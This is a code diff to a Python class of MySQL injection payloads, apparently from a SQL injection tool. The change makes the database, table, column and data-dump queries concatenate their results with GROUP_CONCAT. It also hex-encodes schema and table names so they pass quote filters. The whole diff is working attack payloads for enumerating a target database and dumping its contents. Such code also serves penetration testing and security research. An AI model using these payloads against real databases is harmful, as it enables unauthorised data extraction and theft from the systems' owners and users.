@@ -21,27 +21,27 @@ class MySQLPayloads:
     @staticmethod
     def databases() -> List[str]:
         return [
-            "SELECT schema_name FROM information_schema.schemata",
-            "SELECT DISTINCT db FROM mysql.db",
+            "SELECT GROUP_CONCAT(DISTINCT schema_name SEPARATOR 0x2c) FROM information_schema.schemata",
+            "SELECT GROUP_CONCAT(DISTINCT db SEPARATOR 0x2c) FROM mysql.db",
         ]
 
     @staticmethod
     def tables(db: str) -> List[str]:
         return [
-            f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
-            f"SELECT table_name FROM information_schema.tables WHERE table_schema=0x{db.encode().hex()}",
+            f"SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema='{db}'",
+            f"SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema=0x{db.encode().hex()}",
         ]
 
     @staticmethod
     def columns(db: str, table: str) -> List[str]:
         return [
-            f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
-            f"SELECT column_name FROM information_schema.columns WHERE table_schema=0x{db.encode().hex()} AND table_name=0x{table.encode().hex()}",
+            f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
+            f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) FROM information_schema.columns WHERE table_schema=0x{db.encode().hex()} AND table_name=0x{table.encode().hex()}",
         ]
 
     @staticmethod
     def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
-        q = f"SELECT {column} FROM {db}.{table}"
+        q = f"SELECT GROUP_CONCAT({column} SEPARATOR 0x0a) FROM {db}.{table}"
         if limit > 0:
             q += f" LIMIT {limit}"
         return [q]
